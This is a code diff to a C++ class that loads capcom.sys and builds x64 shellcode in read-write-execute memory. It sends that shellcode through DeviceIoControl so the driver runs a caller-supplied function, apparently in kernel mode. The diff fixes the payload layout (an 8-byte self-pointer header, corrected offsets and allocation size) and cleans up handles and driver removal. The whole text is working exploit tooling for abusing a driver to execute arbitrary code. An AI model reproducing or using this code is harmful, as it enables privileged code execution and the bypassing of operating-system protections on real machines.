@@ -7,12 +7,13 @@ bool CapcomControl::ExecuteUserFunction(void* p_func, void* p_param)
         return false;
     }
 
-    void* payload_ptr = nullptr;
+    BYTE* payload_ptr = nullptr;
 
     if (p_param)
     {
         BYTE payload_template[] =
         {
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
             0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, p_param
@@ -20,7 +21,7 @@ bool CapcomControl::ExecuteUserFunction(void* p_func, void* p_param)
             0xFF, 0x20                                                  // JMP [RAX]
         };
 
-        payload_ptr = VirtualAlloc(nullptr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         if (!payload_ptr)
         {
             LOG("[-] VirtualAlloc error %d", GetLastError());
@@ -28,23 +29,25 @@ bool CapcomControl::ExecuteUserFunction(void* p_func, void* p_param)
             return false;
         }
         
-        *(DWORD64*)(payload_template + 0x05) = (DWORD64)p_func;
-        *(DWORD64*)(payload_template + 0x0F) = (DWORD64)p_param;
-
-        ZeroMemory(payload_ptr, PAGE_SIZE);
+        ZeroMemory(payload_ptr, sizeof(payload_template));
         memcpy(payload_ptr, payload_template, sizeof(payload_template));
+
+        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
+        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func;
+        *(DWORD64*)(payload_ptr + 23) = (DWORD64)p_param;
     }
     else
     {
         BYTE payload_template[] =
         {
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
             0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 - will put p_func into RAX
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // p_func
             0x58,                                                       // POP RAX
             0xFF, 0x20                                                  // JMP [RAX]
         };
 
-        payload_ptr = VirtualAlloc(nullptr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        payload_ptr = (BYTE*)VirtualAlloc(nullptr, sizeof(payload_template), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         if (!payload_ptr)
         {
             LOG("[-] VirtualAlloc error %d", GetLastError());
@@ -52,16 +55,19 @@ bool CapcomControl::ExecuteUserFunction(void* p_func, void* p_param)
             return false;
         }
 
-        *(DWORD64*)(payload_template + 0x05) = (DWORD64)p_func;
-        
-        ZeroMemory(payload_ptr, PAGE_SIZE);
+        ZeroMemory(payload_ptr, sizeof(payload_template));
         memcpy(payload_ptr, payload_template, sizeof(payload_template));
+
+        *(DWORD64*)payload_ptr = (DWORD64)(payload_ptr + 8);
+        *(DWORD64*)(payload_ptr + 13) = (DWORD64)p_func;
     }
 
     DWORD output_buf;
     DWORD bytes_returned;
 
-    if (!DeviceIoControl(device_handle, CAPCOM_IOCTL, &payload_ptr, CAPCOM_INPUT_BUF_SIZE, &output_buf, CAPCOM_OUTPUT_BUF_SIZE, &bytes_returned, nullptr))
+    BYTE* target = payload_ptr + sizeof(void*);
+
+    if (!DeviceIoControl(device_handle, CAPCOM_IOCTL, &target, CAPCOM_INPUT_BUF_SIZE, &output_buf, CAPCOM_OUTPUT_BUF_SIZE, &bytes_returned, nullptr))
     {
         LOG("[-] DeviceIoControl error %d", GetLastError());
 
@@ -130,6 +136,8 @@ bool CapcomControl::Unload()
 
     std::filesystem::path _driver_name(driver_name);
 
+    CloseHandle(device_handle);
+
     if (!service::UnregisterAndStop(_driver_name))
     {
         LOG("[-] Can't unregister and stop capcom.sys, error %d", GetLastError());
@@ -137,5 +145,14 @@ bool CapcomControl::Unload()
         return false;
     }
 
-    return std::filesystem::remove(driver_temp_path);
+    try
+    {
+        return std::filesystem::remove(driver_temp_path);
+    }
+    catch (std::exception& ex)
+    {
+        LOG("%s", ex.what());
+
+        return false;
+    }
 }
